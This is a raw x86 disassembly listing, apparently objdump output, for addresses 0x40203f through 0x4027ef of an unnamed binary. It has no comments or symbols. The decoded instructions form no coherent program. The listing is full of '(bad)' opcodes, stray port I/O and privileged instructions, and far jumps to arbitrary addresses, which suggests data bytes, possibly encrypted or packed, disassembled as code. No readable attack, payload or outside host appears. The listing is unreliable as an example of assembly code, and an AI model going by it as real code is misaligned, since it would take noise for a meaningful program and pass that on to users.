  40203f:	xor    al,0x29
  402041:	pop    DWORD PTR [eax]
  402043:	sbb    cl,dh
  402045:	cdq    
  402046:	gs loop 0x402080
  402049:	xchg   ebp,eax
  40204a:	icebp  
  40204b:	test   eax,0x29acd234
  402050:	xchg   esp,eax
  402051:	sbb    al,0x4c
  402053:	xchg   esi,eax
  402054:	xor    DWORD PTR [eax+0x4a],ebx
  402057:	sub    bl,BYTE PTR [ecx]
  402059:	inc    esp
  40205a:	and    DWORD PTR [eax+eiz*4-0x60],ebp
  40205e:	inc    ecx
  40205f:	pop    es
  402060:	add    DWORD PTR [ebx],eax
  402062:	jo     0x40209a
  402064:	mov    eax,0xb5af1586
  402069:	mov    ds:0x667fb8a7,eax
  40206e:	mov    ecx,0x357bcdb9
  402073:	aaa    
  402074:	(bad)  
  402076:	push   ebp
  402077:	adc    ch,BYTE PTR [ecx+0x15]
  40207a:	pop    ebp
  40207b:	retf   
  40207c:	or     al,0x64
  40207e:	loope  0x40209b
  402080:	out    dx,eax
  402081:	and    ebx,DWORD PTR [ecx+edx*8+0x6e]
  402085:	cmp    BYTE PTR [ebx+ecx*2-0x76],0x4a
  40208a:	mov    bl,0xd6
  40208c:	in     al,dx
  40208d:	mov    bl,0xbd
  40208f:	sahf   
  402090:	fsub   DWORD PTR [eax-0xb]
  402093:	add    DWORD PTR [eax-0x64],ebp
  402096:	call   0x6711bea9
  40209b:	arpl   cx,cx
  40209d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40209e:	xchg   esi,eax
  40209f:	and    bh,BYTE PTR [ebx+0x49]
  4020a2:	sub    eax,0x2d84f2
  4020a8:	popa   
  4020a9:	les    edi,FWORD PTR [edx]
  4020ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020ac:	imul   ebx,DWORD PTR [eax-0x6c6c329],0x12
  4020b3:	mov    ds:0x23df01f0,al
  4020b8:	sub    dh,ah
  4020ba:	push   ds
  4020bb:	mov    cl,0xbf
  4020bd:	push   es
  4020be:	inc    edx
  4020bf:	adc    eax,0x79c3eb8
  4020c4:	outs   dx,BYTE PTR ds:[esi]
  4020c5:	in     eax,0x79
  4020c7:	adc    bh,BYTE PTR [edi+0x5b8a15c2]
  4020cd:	or     DWORD PTR [ecx-0x7bc94c22],edx
  4020d3:	mov    bh,0xa9
  4020d5:	mov    edx,0xc53c5500
  4020da:	jp     0x40214b
  4020dc:	dec    esi
  4020dd:	int    0x18
  4020df:	data16 aaa 
  4020e1:	bound  esi,QWORD PTR [eax]
  4020e3:	sub    esp,DWORD PTR [esi-0x610950d1]
  4020e9:	pop    ecx
  4020ea:	in     eax,dx
  4020eb:	jns    0x402075
  4020ed:	xor    ah,ah
  4020ef:	cmp    eax,DWORD PTR [edi+0x7a771b76]
  4020f5:	mov    bh,0x66
  4020f7:	dec    esi
  4020f8:	inc    edi
  4020f9:	mov    esp,0xc1c07879
  4020fe:	sbb    BYTE PTR [edi-0x46],bl
  402101:	mov    edi,0xd48be658
  402106:	sub    BYTE PTR [ebx-0x3d],bl
  402109:	xlat   BYTE PTR ds:[ebx]
  40210a:	adc    eax,0x29b89e01
  40210f:	popf   
  402110:	pushf  
  402111:	pop    esp
  402112:	mov    WORD PTR [esi+0x33],ds
  402115:	xlat   BYTE PTR ds:[ebx]
  402116:	sub    ecx,DWORD PTR [ecx]
  402118:	les    edi,FWORD PTR [esi-0x2]
  40211b:	mov    bl,BYTE PTR [ecx]
  40211d:	sbb    BYTE PTR [eax-0x54],bl
  402120:	popa   
  402121:	stos   BYTE PTR es:[edi],al
  402122:	mov    ebp,0x1b05404f
  402127:	jmp    0xda8974e4
  40212c:	push   ecx
  40212d:	arpl   WORD PTR ds:0xd1bde4ca,sp
  402133:	nop
  402134:	pop    ss
  402135:	sbb    al,BYTE PTR [ecx-0x64]
  402138:	mov    ch,0x9a
  40213a:	ror    BYTE PTR [esi+0x59],1
  40213d:	or     esi,DWORD PTR [ebx-0x59773a74]
  402143:	loopne 0x402192
  402145:	add    al,0xbd
  402147:	ja     0x40215f
  402149:	and    DWORD PTR [edi],ebx
  40214b:	sub    DWORD PTR [ebp-0x24],ebx
  40214e:	sub    BYTE PTR [ecx],al
  402150:	stc    
  402151:	test   ch,al
  402153:	ja     0x40217b
  402155:	sub    BYTE PTR [esi+ecx*4+0x79],ch
  402159:	int    0x72
  40215b:	loopne 0x40212d
  40215d:	sub    eax,0xa9c63193
  402162:	cld    
  402163:	ror    DWORD PTR [ecx+0x6d],cl
  402166:	push   esp
  402167:	mov    edx,0x465a28b
  40216c:	ret    0xbed6
  40216f:	gs xor al,0x65
  402172:	sbb    ah,BYTE PTR [ecx+0x67]
  402175:	push   edx
  402176:	jl     0x402160
  402178:	xchg   ebx,eax
  402179:	mov    dh,0x94
  40217b:	inc    edx
  40217c:	mov    ch,0xc6
  40217e:	(bad)  
  40217f:	push   edx
  402180:	lods   eax,DWORD PTR ds:[esi]
  402181:	jge    0x4021f4
  402183:	aam    0x3e
  402185:	daa    
  402186:	push   edx
  402187:	and    DWORD PTR [ecx-0x13b08ebe],ecx
  40218d:	rcr    DWORD PTR [edx],0xae
  402190:	sub    al,0xd3
  402192:	add    bl,ah
  402194:	je     0x40214a
  402196:	push   0x72
  402198:	or     DWORD PTR [esi+0x4eb1cc0a],ebp
  40219e:	aaa    
  40219f:	push   0x6e8efff8
  4021a4:	mov    al,0x9b
  4021a6:	mov    ebp,0xc308c701
  4021ab:	xchg   ebx,eax
  4021ac:	jbe    0x402226
  4021ae:	sbb    esp,edi
  4021b0:	cwde   
  4021b1:	push   ebp
  4021b2:	in     al,0x68
  4021b4:	daa    
  4021b5:	je     0x402236
  4021b7:	or     edx,DWORD PTR [esi+esi*1]
  4021ba:	cmp    al,0x2d
  4021bc:	ins    DWORD PTR es:[edi],dx
  4021bd:	sti    
  4021be:	jnp    0x402206
  4021c0:	inc    eax
  4021c1:	cmc    
  4021c2:	cwde   
  4021c3:	out    dx,al
  4021c4:	pop    ebp
  4021c5:	cmp    eax,0xeacce7fc
  4021ca:	or     BYTE PTR [ecx],al
  4021cc:	xor    al,0x77
  4021ce:	fisttp DWORD PTR gs:[edi+eax*2+0x7959ef00]
  4021d6:	mov    cl,0x30
  4021d8:	pop    ecx
  4021d9:	push   0x4f
  4021db:	xchg   esp,eax
  4021dc:	into   
  4021dd:	call   0xc2f5:0x4b9cd4c8
  4021e4:	pop    esi
  4021e5:	sub    DWORD PTR [edi],edi
  4021e7:	dec    ecx
  4021e8:	test   BYTE PTR [ecx],dh
  4021ea:	jne    0x402203
  4021ec:	into   
  4021ed:	fs xchg ecx,eax
  4021ef:	add    BYTE PTR [ecx-0x2953f94d],bl
  4021f5:	daa    
  4021f6:	cmc    
  4021f7:	fbstp  TBYTE PTR [edx+0x15]
  4021fa:	and    eax,0xb51f8d51
  4021ff:	jb     0x4021a1
  402201:	jmp    0x615c:0x76b506cc
  402208:	daa    
  402209:	(bad)  
  40220a:	std    
  40220b:	js     0x402258
  40220d:	xchg   edi,eax
  40220e:	pusha  
  40220f:	sti    
  402210:	loope  0x4021b2
  402212:	bound  eax,QWORD PTR [ecx+0x11]
  402215:	repz das 
  402217:	cmp    eax,0xe118334c
  40221c:	scas   eax,DWORD PTR es:[edi]
  40221d:	rcl    esp,cl
  40221f:	enter  0x41f1,0xa5
  402223:	int3   
  402224:	dec    ebx
  402225:	daa    
  402226:	popa   
  402227:	imul   ebp,DWORD PTR [eax-0x1e],0x4bb2f239
  40222e:	je     0x4021c6
  402230:	pop    ebx
  402231:	mov    BYTE PTR [esi],ch
  402233:	stos   DWORD PTR es:[edi],eax
  402234:	scas   eax,DWORD PTR es:[edi]
  402235:	scas   eax,DWORD PTR es:[edi]
  402236:	das    
  402237:	xor    BYTE PTR [ebp-0x74],cl
  40223a:	xchg   esi,eax
  40223b:	mov    DWORD PTR [edi-0x35d3e4f1],ebx
  402241:	in     eax,0x3c
  402243:	les    ebx,FWORD PTR [eax+0x35]
  402246:	ins    BYTE PTR es:[edi],dx
  402247:	out    0xe6,eax
  402249:	adc    ah,BYTE PTR [edx-0x1d]
  40224c:	fisttp QWORD PTR [edi-0x39]
  40224f:	inc    ebp
  402250:	xchg   esp,eax
  402251:	mov    BYTE PTR [ecx],al
  402253:	add    BYTE PTR [eax],al
  402255:	mov    DWORD PTR [ebp-0x70],0x5b3f
  40225c:	and    DWORD PTR ds:0x4228be,ecx
  402262:	jmp    0x4027ec
  402267:	loope  0x402242
  402269:	mov    bh,0x25
  40226b:	scas   eax,DWORD PTR es:[edi]
  40226c:	sbb    DWORD PTR [ecx+0x19],ebx
  40226f:	dec    edx
  402270:	retf   0x7262
  402273:	pop    ebx
  402274:	gs jbe 0x402225
  402277:	mov    eax,ds:0x3d1616f6
  40227c:	add    al,0x16
  40227e:	push   ss
  40227f:	sub    BYTE PTR [eax-0x5298c838],al
  402285:	leave  
  402286:	pop    eax
  402287:	sub    ebx,0x3e3229f4
  40228d:	cmp    esp,DWORD PTR [edx]
  40228f:	jle    0x402224
  402291:	and    BYTE PTR [ebp-0x3c75f5cc],ah
  402297:	xor    BYTE PTR [ebx],bl
  402299:	out    dx,al
  40229a:	arpl   WORD PTR [edx+0x64a284ae],bp
  4022a0:	mov    dl,0xeb
  4022a2:	addr16 inc esp
  4022a4:	cmp    eax,0xc047ad90
  4022a9:	pop    esi
  4022aa:	add    BYTE PTR [edx-0xad2ff33],0x27
  4022b1:	lahf   
  4022b2:	dec    ecx
  4022b3:	(bad)  [ebx+0x75]
  4022b6:	jb     0x4022cd
  4022b8:	xor    BYTE PTR [eax+0x7a],bl
  4022bb:	jp     0x402261
  4022bd:	mov    eax,0x66384206
  4022c2:	loope  0x40233c
  4022c4:	add    BYTE PTR [edi],0xcd
  4022c7:	fstp   QWORD PTR [esi-0x17]
  4022ca:	mov    WORD PTR [ecx],fs
  4022cc:	push   esp
  4022cd:	int    0xa5
  4022cf:	mov    ds:0xd3f06d78,al
  4022d4:	aad    0xb3
  4022d6:	pop    eax
  4022d7:	xor    BYTE PTR [edx],ch
  4022d9:	xor    al,0x8a
  4022db:	cmp    esp,DWORD PTR [esi-0x43]
  4022de:	push   ds
  4022df:	cmp    bl,ch
  4022e1:	std    
  4022e2:	push   esi
  4022e3:	(bad)  
  4022e4:	push   esi
  4022e5:	mov    edi,0x9689fe01
  4022ea:	js     0x40229a
  4022ec:	push   ebx
  4022ed:	cdq    
  4022ee:	inc    ecx
  4022ef:	sub    al,0x4a
  4022f1:	mov    al,0xe3
  4022f3:	sub    eax,0x5577d303
  4022f8:	jno    0x4022b4
  4022fa:	out    0x15,eax
  4022fc:	pop    ax
  4022fe:	pushf  
  4022ff:	xor    eax,0xcc394f87
  402304:	ja     0x4022d1
  402306:	mov    bh,0x17
  402308:	dec    edx
  402309:	push   0x1f06eb45
  40230e:	test   eax,0x1eeda51b
  402313:	push   ebp
  402314:	leave  
  402315:	lods   eax,DWORD PTR ds:[esi]
  402316:	add    ecx,edi
  402318:	(bad)  
  40231a:	loopne 0x4022a3
  40231c:	imul   ebx,DWORD PTR [eax],0x2e434839
  402322:	dec    esp
  402323:	adc    ch,BYTE PTR [ebp-0x34]
  402326:	xor    DWORD PTR [ecx+eiz*8],ecx
  402329:	mov    dh,BYTE PTR fs:[ecx-0xe6a1009]
  402330:	outs   dx,DWORD PTR es:[esi]
  402332:	dec    ecx
  402333:	xor    al,0x7f
  402335:	stos   DWORD PTR es:[edi],eax
  402336:	(bad)  
  402337:	retf   
  402338:	jp     0x402352
  40233a:	fisttp QWORD PTR [ebx+edx*4]
  40233d:	add    ebp,ebx
  40233f:	mov    esi,0xcc2b6d61
  402344:	(bad)  
  402345:	jle    0x4023b0
  402347:	adc    dl,bl
  402349:	jnp    0x4023c9
  40234b:	push   ecx
  40234c:	in     al,0x9
  40234e:	mov    ds:0x2047f0ae,eax
  402353:	leave  
  402354:	lds    esp,FWORD PTR [esi-0x61]
  402357:	xchg   DWORD PTR [eax+0x347d176],edx
  40235d:	xor    al,0x5d
  40235f:	push   esi
  402360:	out    dx,al
  402361:	mov    ds:0xa3f94b01,al
  402366:	adc    dh,BYTE PTR [esp+ecx*1]
  402369:	das    
  40236a:	fistp  WORD PTR [eax+eax*1]
  40236d:	(bad)  
  40236e:	in     al,dx
  40236f:	imul   ebx,eax,0x4d
  402372:	int3   
  402373:	cld    
  402374:	or     al,0xcb
  402376:	dec    ecx
  402377:	or     cl,BYTE PTR [edi+0x4d]
  40237a:	pop    es
  40237b:	cs aas 
  40237d:	cmp    eax,0xcac969ac
  402382:	stos   BYTE PTR es:[edi],al
  402383:	lea    esi,[esi-0x12]
  402386:	mov    eax,ds:0x67628d50
  40238b:	aam    0xdf
  40238d:	(bad)  [ebx+0x9]
  402390:	lea    ebx,[ecx]
  402392:	jbe    0x4023ae
  402394:	inc    edx
  402395:	icebp  
  402396:	stos   DWORD PTR es:[edi],eax
  402397:	or     DWORD PTR ds:0xc1b9df37,eax
  40239d:	scas   al,BYTE PTR es:[edi]
  40239e:	fs mov ecx,0x380bfe76
  4023a4:	add    esi,DWORD PTR [eax+0x4637bd8c]
  4023aa:	adc    esi,DWORD PTR [ecx+0x6e]
  4023ad:	xor    eax,0xd6499994
  4023b2:	retf   
  4023b3:	(bad)  
  4023b4:	push   ds
  4023b5:	lahf   
  4023b6:	int    0xc
  4023b8:	mov    edx,0xd6b56c37
  4023bd:	wbinvd 
  4023bf:	mov    cl,0x2e
  4023c1:	cwde   
  4023c2:	test   al,0x66
  4023c4:	and    al,0xf2
  4023c6:	(bad)  
  4023c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023c8:	sbb    bh,ah
  4023ca:	adc    eax,0xea48ba15
  4023cf:	sbb    ch,al
  4023d1:	lahf   
  4023d2:	pop    esi
  4023d3:	ins    BYTE PTR es:[edi],dx
  4023d4:	cld    
  4023d5:	cmp    eax,0xe80e154a
  4023da:	mov    ebp,DWORD PTR [edx+0x0]
  4023dd:	into   
  4023de:	jbe    0x402366
  4023e0:	mov    esi,0x394c9ca6
  4023e5:	int3   
  4023e6:	xchg   edi,eax
  4023e7:	lds    eax,FWORD PTR [edx-0x49]
  4023ea:	mov    BYTE PTR [edi],0x14
  4023ed:	mov    esi,0xb3ada2bc
  4023f2:	xchg   DWORD PTR [ebx+0x3f987aab],ebp
  4023f8:	ret    0x7490
  4023fb:	scas   al,BYTE PTR es:[edi]
  4023fc:	pop    es
  4023fd:	or     al,0xde
  4023ff:	cld    
  402400:	cmp    DWORD PTR [ebx+0x3a],0x57
  402404:	push   0xffffff9f
  402406:	mov    al,ds:0x28187ab4
  40240b:	pop    ebx
  40240c:	sar    BYTE PTR [edi],cl
  40240e:	stc    
  40240f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402410:	ins    BYTE PTR es:[edi],dx
  402411:	loope  0x402452
  402413:	ficom  WORD PTR [esi]
  402415:	lock daa 
  402417:	dec    eax
  402418:	push   0xb79d6314
  40241d:	mov    edx,0xcfeb2c7a
  402422:	stc    
  402423:	ja     0x40246f
  402425:	enter  0x9db,0x4e
  402429:	push   cs
  40242a:	nop
  40242b:	stos   BYTE PTR es:[edi],al
  40242c:	push   esp
  40242d:	lods   eax,DWORD PTR ds:[esi]
  40242e:	xchg   ebp,eax
  40242f:	mov    ebp,edi
  402431:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402432:	sub    eax,0x7abdabf4
  402437:	push   esp
  402438:	sti    
  402439:	fldcw  WORD PTR [edx-0x2d2e3e2c]
  40243f:	out    dx,al
  402440:	mov    ecx,0x9bf23ce6
  402445:	cld    
  402446:	loopne 0x40243a
  402448:	and    ebp,ebp
  40244a:	popf   
  40244b:	(bad)  
  40244c:	sbb    al,0xb4
  40244e:	jp     0x4023d2
  402450:	jno    0x402403
  402452:	dec    edi
  402453:	adc    BYTE PTR [eax-0x18],dl
  402456:	mov    esp,0x8ff89749
  40245b:	push   es
  40245c:	cmp    edi,DWORD PTR [ebx+0xf]
  40245f:	mov    ah,0xc4
  402461:	dec    edi
  402462:	sbb    ecx,DWORD PTR [eax+0x40]
  402465:	inc    ebx
  402466:	inc    ebx
  402467:	jbe    0x402479
  402469:	imul   ecx,DWORD PTR [ecx-0x14545048],0x4e
  402470:	std    
  402471:	xchg   esp,eax
  402472:	loope  0x402488
  402474:	xchg   ebp,eax
  402475:	pop    esi
  402476:	mov    ah,0xf3
  402478:	xchg   esi,eax
  402479:	xchg   edx,eax
  40247a:	xchg   edx,eax
  40247b:	mov    ch,0x1d
  40247d:	mov    edi,0xaa8da072
  402482:	ins    BYTE PTR es:[edi],dx
  402483:	sbb    esp,ebx
  402485:	shl    DWORD PTR [ebp+0x5fdec07],1
  40248b:	mov    eax,0x42a87155
  402490:	jl     0x402471
  402492:	xchg   ecx,eax
  402493:	cmp    cl,BYTE PTR [ebx]
  402495:	sub    BYTE PTR [edi+0x41],ah
  402498:	pop    es
  402499:	mov    al,ds:0x35d2dd72
  40249e:	and    edi,edi
  4024a0:	(bad)  
  4024a1:	pop    edx
  4024a2:	add    ch,ah
  4024a4:	arpl   di,dx
  4024a6:	scas   al,BYTE PTR es:[edi]
  4024a7:	adc    BYTE PTR [esi-0x7],al
  4024aa:	clc    
  4024ab:	inc    esp
  4024ac:	xchg   esp,eax
  4024ad:	scas   eax,DWORD PTR es:[edi]
  4024ae:	mov    al,ds:0x28905ea8
  4024b3:	fcmovb st,st(1)
  4024b5:	fldenv [ebp+edx*2+0x50]
  4024b9:	mov    BYTE PTR [edi+0x3c41a1ea],ah
  4024bf:	outs   dx,BYTE PTR ds:[esi]
  4024c0:	ret    
  4024c1:	ja     0x4024ac
  4024c3:	push   ebp
  4024c4:	sbb    esp,esi
  4024c6:	out    0x98,eax
  4024c8:	pmaddwd mm2,mm0
  4024cb:	push   ebp
  4024cc:	cmc    
  4024cd:	push   0xffffffc3
  4024cf:	and    ebx,DWORD PTR [ecx-0x5c46d64e]
  4024d5:	jecxz  0x4024f8
  4024d7:	sbb    eax,0xb326078d
  4024dc:	xchg   ebp,eax
  4024dd:	jae    0x402557
  4024df:	mov    ds:0x6d0672fc,eax
  4024e4:	mov    BYTE PTR ds:0x99d82c41,ch
  4024ea:	mov    bh,0x4b
  4024ec:	in     eax,dx
  4024ed:	sub    ebp,DWORD PTR [esi]
  4024ef:	pop    eax
  4024f0:	mov    cl,0x5c
  4024f2:	pop    es
  4024f3:	fdiv   QWORD PTR [edi+0x2cb26787]
  4024f9:	(bad)
  4024fc:	mov    ah,0x55
  4024fe:	fwait
  4024ff:	ins    DWORD PTR es:[edi],dx
  402500:	loop   0x4024a9
  402502:	and    BYTE PTR [edx],dl
  402504:	push   edi
  402505:	or     DWORD PTR [eax-0x69],ebx
  402508:	dec    edi
  402509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40250a:	or     al,0xab
  40250c:	test   DWORD PTR [edx-0x49877470],eax
  402512:	ja     0x4024b9
  402514:	mov    esi,ss
  402516:	push   edx
  402517:	(bad)  
  402518:	cwde   
  402519:	or     eax,0xb6e75ab2
  40251e:	dec    esi
  40251f:	add    DWORD PTR [esi+0xb],esp
  402522:	iret   
  402523:	pop    eax
  402524:	mov    al,ds:0x8cd25556
  402529:	pop    edi
  40252a:	das    
  40252b:	stc    
  40252c:	lods   al,BYTE PTR ds:[esi]
  40252d:	xor    edx,DWORD PTR [edx]
  40252f:	push   es
  402530:	popf   
  402531:	fisub  WORD PTR ds:0x874573f4
  402537:	xchg   edx,eax
  402538:	rol    BYTE PTR [ebx+0x1fc2ed2c],1
  40253e:	cmc    
  40253f:	out    dx,al
  402540:	imul   ebx,esp,0xffffff8a
  402543:	loope  0x402574
  402545:	ins    BYTE PTR es:[edi],dx
  402546:	(bad)  
  402547:	push   esi
  402548:	sbb    BYTE PTR [eax],0x57
  40254b:	scas   eax,DWORD PTR es:[edi]
  40254c:	sbb    ebp,DWORD PTR [ecx+0x38]
  40254f:	and    al,0x74
  402551:	scas   eax,DWORD PTR es:[edi]
  402552:	jae    0x40250f
  402554:	mov    al,ds:0x55e7d72
  402559:	dec    eax
  40255a:	jg     0x402524
  40255c:	inc    esi
  40255d:	dec    ecx
  40255e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40255f:	sub    BYTE PTR [esi],0x88
  402562:	addr16 dec ch
  402565:	and    bh,BYTE PTR [eax]
  402567:	inc    esi
  402568:	imul   esp,DWORD PTR es:[edx+0x5e9ba591],0x651e6294
  402573:	pop    ebx
  402574:	sbb    ebp,DWORD PTR [edi+eiz*1-0x48]
  402578:	mov    dl,0xdc
  40257a:	xor    BYTE PTR [edx+0x6192ed74],0xd1
  402581:	lods   eax,DWORD PTR ds:[esi]
  402582:	push   0x20
  402584:	jo     0x4025b3
  402586:	or     al,0xcf
  402588:	fs popa 
  40258a:	sub    BYTE PTR [ebp-0x2f188fce],bh
  402590:	xor    edx,DWORD PTR [esi+ecx*8+0x25b614bb]
  402597:	rol    BYTE PTR [ebp-0x6a],1
  40259a:	and    DWORD PTR [esi],edi
  40259c:	dec    esp
  40259d:	push   ss
  40259e:	push   eax
  40259f:	jae    0x402533
  4025a1:	ret    0xe4c
  4025a4:	mov    ds:0x364525a4,eax
  4025a9:	aad    0x63
  4025ab:	outs   dx,DWORD PTR ds:[esi]
  4025ac:	push   ecx
  4025ad:	mov    ch,0x34
  4025af:	pushf  
  4025b0:	xchg   edx,eax
  4025b1:	push   eax
  4025b2:	inc    esp
  4025b3:	cmp    BYTE PTR [edx],dl
  4025b5:	mov    edi,0x262f1906
  4025ba:	or     DWORD PTR [ecx],ebp
  4025bc:	out    0xe0,al
  4025be:	int3   
  4025bf:	mov    cl,0x82
  4025c1:	sub    edx,edx
  4025c3:	imul   edx,DWORD PTR [ebx+0x1c],0xb0924281
  4025ca:	inc    esp
  4025cb:	sub    al,0x1e
  4025cd:	jmp    0x86ee9d8a
  4025d2:	add    al,0x5
  4025d4:	mov    ch,0x67
  4025d6:	(bad)  
  4025d7:	mov    ecx,0x5ba6a8be
  4025dc:	data16 jo 0x4025d3
  4025df:	into   
  4025e0:	or     DWORD PTR [eax+0x66454564],edi
  4025e6:	out    dx,eax
  4025e7:	aad    0x68
  4025e9:	pop    edi
  4025ea:	test   ch,0xdc
  4025ed:	test   al,0x51
  4025ef:	xchg   ebx,eax
  4025f0:	retf   0x902f
  4025f3:	sbb    eax,0xf38f611a
  4025f8:	std    
  4025f9:	aam    0xf2
  4025fb:	stc    
  4025fc:	cmp    dl,dh
  4025fe:	fcom   QWORD PTR [ebx]
  402600:	(bad)  
  402601:	in     al,0xcf
  402603:	mov    eax,0x9d0b9287
  402608:	mov    al,0x5b
  40260a:	cmp    ch,BYTE PTR fs:[edi-0x2]
  40260e:	and    BYTE PTR [ecx-0x4adba39],ah
  402614:	push   0xffffff88
  402616:	daa    
  402617:	fsubr  DWORD PTR [edx]
  402619:	les    esi,FWORD PTR [eax]
  40261b:	sti    
  40261c:	mov    edi,0xabdf6a13
  402621:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402622:	neg    BYTE PTR [edx-0x3c]
  402625:	pop    es
  402626:	shl    DWORD PTR [esp+esi*8-0x6a11cd57],0x95
  40262e:	stos   DWORD PTR es:[di],eax
  402630:	inc    edi
  402631:	mov    edx,0xacdaa239
  402636:	and    edx,DWORD PTR ds:0xfa0583e5
  40263c:	mov    ebx,0xa40cfc36
  402641:	ret    0x3f89
  402644:	jge    0x4026b2
  402646:	test   ch,ch
  402648:	xlat   BYTE PTR ds:[ebx]
  402649:	jge    0x402650
  40264b:	(bad)  
  40264c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40264d:	cmp    BYTE PTR [ebx+0x38],bl
  402650:	std    
  402651:	jbe    0x40266c
  402653:	int    0xff
  402655:	std    
  402656:	scas   al,BYTE PTR es:[edi]
  402657:	jb     0x4026d7
  402659:	cmp    dh,BYTE PTR [edi]
  40265b:	xor    al,0x57
  40265d:	lds    ecx,FWORD PTR gs:[edx+0x3a]
  402661:	cmp    edx,ebx
  402663:	ja     0x402645
  402665:	mov    ecx,0x11f59757
  40266a:	fistp  DWORD PTR [edi+0x28]
  40266d:	mov    bl,0xdc
  40266f:	scas   al,BYTE PTR es:[edi]
  402670:	xchg   esp,ecx
  402672:	out    dx,al
  402673:	lea    eax,[ebp+0x9b3ca1e]
  402679:	stos   DWORD PTR es:[edi],eax
  40267a:	sub    edx,esi
  40267c:	scas   eax,DWORD PTR es:[edi]
  40267d:	cmp    ecx,edx
  40267f:	xchg   ebp,eax
  402680:	pop    es
  402681:	loop   0x402670
  402683:	mov    esi,0xaba343a
  402688:	adc    al,0xdd
  40268a:	aas    
  40268b:	cmp    al,al
  40268d:	inc    edx
  40268e:	jmp    0x1843:0x8180900e
  402695:	mov    ?,WORD PTR [ebx-0x42]
  402698:	out    dx,al
  402699:	jb     0x402635
  40269b:	cmp    eax,0x6ec8f41b
  4026a0:	mov    al,ds:0xb25b0398
  4026a5:	out    dx,al
  4026a6:	dec    eax
  4026a7:	retf   0x6736
  4026aa:	dec    esi
  4026ab:	xor    DWORD PTR [esi-0x28b9ec5c],esi
  4026b1:	pop    edi
  4026b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026b3:	sub    DWORD PTR [ecx+0x60],esp
  4026b6:	sbb    eax,0x2c62cf83
  4026bb:	add    al,0x21
  4026bd:	ss inc ebx
  4026bf:	adc    edi,edi
  4026c1:	ds dec edx
  4026c3:	mov    bl,0x24
  4026c5:	mov    eax,ds:0xdc4fd4dd
  4026ca:	cld    
  4026cb:	rcl    DWORD PTR ds:0x99cb2611,1
  4026d1:	retf   0xcc30
  4026d4:	add    BYTE PTR [edi-0x3f],bl
  4026d7:	add    BYTE PTR es:[esi+esi*1],al
  4026db:	lahf   
  4026dc:	and    eax,0x8eb3ae5a
  4026e1:	cmp    eax,0x652efdd2
  4026e6:	dec    eax
  4026e7:	xlat   BYTE PTR ds:[ebx]
  4026e8:	out    0xc3,eax
  4026ea:	cmp    eax,0x28193ae8
  4026ef:	sub    eax,DWORD PTR [edi]
  4026f1:	jecxz  0x402771
  4026f3:	sbb    al,BYTE PTR [esi+0x6d]
  4026f6:	stos   BYTE PTR es:[edi],al
  4026f7:	ret    0xcabd
  4026fa:	jmp    0x603a:0xa94bd518
  402701:	sti    
  402702:	mov    ebp,0x7c87cbfc
  402707:	aaa    
  402708:	jne    0x4026eb
  40270a:	je     0x2cf76176
  402710:	xor    BYTE PTR ds:0x974712d4,cl
  402716:	adc    BYTE PTR [ebx+0x4fa394c9],cl
  40271c:	sub    al,0x45
  40271e:	and    eax,0xf870d677
  402723:	jbe    0x4026c9
  402725:	in     al,0x96
  402727:	pusha  
  402728:	and    esp,DWORD PTR ds:0x5a743300
  40272e:	call   DWORD PTR [edi-0x145fb261]
  402734:	xchg   edx,eax
  402735:	jmp    0x8df165e7
  40273a:	cmp    edx,DWORD PTR [edi]
  40273c:	inc    esp
  40273d:	cmp    BYTE PTR [esi+edx*4+0xe],al
  402741:	sub    eax,DWORD PTR [eax]
  402743:	inc    edi
  402744:	or     esp,DWORD PTR [ebp-0x4]
  402747:	mov    ah,BYTE PTR [ebx-0x26]
  40274a:	gs mov ebp,0x193adb75
  402750:	push   cs
  402751:	inc    ebx
  402752:	lock and DWORD PTR [edx],0xf04c131f
  402759:	inc    edi
  40275a:	mov    edx,0x784b78c7
  40275f:	pop    ds
  402760:	xor    BYTE PTR [ebp+0x5e9a21cd],ah
  402766:	repnz rol BYTE PTR [eax-0x20],cl
  40276a:	push   es
  40276b:	inc    esi
  40276c:	or     al,0x86
  40276e:	and    ebp,esp
  402770:	pop    ebx
  402771:	fiadd  DWORD PTR [ebx+0x27]
  402774:	fdiv   st,st(0)
  402776:	ja     0x4027e1
  402778:	push   edx
  402779:	jle    0x40278b
  40277b:	fldenv [ebx+edx*4+0x2b87b9af]
  402782:	pushf  
  402783:	(bad)  
  402784:	dec    esi
  402785:	call   0xc8fdb8ca
  40278a:	jno    0x40277e
  40278c:	jno    0x4027da
  40278e:	lock sub dl,BYTE PTR ss:[ebp-0x3b]
  402793:	jbe    0x402796
  402795:	sub    DWORD PTR [eax-0x2a89c2f4],esp
  40279b:	jge    0x402776
  40279d:	repnz mov dh,BYTE PTR ds:0x7158fd39
  4027a4:	mov    ah,0x80
  4027a6:	mov    eax,0x5e1cc74
  4027ab:	sub    al,0x7a
  4027ad:	jmp    0x67101cb8
  4027b2:	daa    
  4027b3:	out    dx,al
  4027b4:	xor    eax,0x2272fb7e
  4027b9:	rol    BYTE PTR [eax],cl
  4027bb:	outs   dx,DWORD PTR ds:[esi]
  4027bc:	outs   dx,BYTE PTR ds:[esi]
  4027bd:	dec    ebx
  4027be:	scas   eax,DWORD PTR es:[edi]
  4027bf:	shr    DWORD PTR [edx-0x65f8d98f],1
  4027c5:	xchg   ebx,eax
  4027c6:	jnp    0x40278b
  4027c8:	xchg   ecx,eax
  4027c9:	or     edi,esi
  4027cb:	daa    
  4027cc:	jmp    0x402818
  4027ce:	cmp    cl,BYTE PTR [esi+0x27]
  4027d1:	pushf  
  4027d2:	mov    ah,0x7e
  4027d4:	into   
  4027d5:	(bad)  
  4027d6:	out    dx,al
  4027d7:	xchg   ebx,eax
  4027d8:	mov    esp,DWORD PTR [ebp+eax*4+0x63827301]
  4027df:	repnz push ecx
  4027e1:	rol    bl,cl
  4027e3:	sbb    al,0xc1
  4027e5:	fs fwait
  4027e7:	add    ecx,DWORD PTR [esi-0x385f5b7b]
  4027ed:	inc    ebp
  4027ee:	xchg   esp,eax
  4027ef:	sbb    DWORD PTR [edx],esi
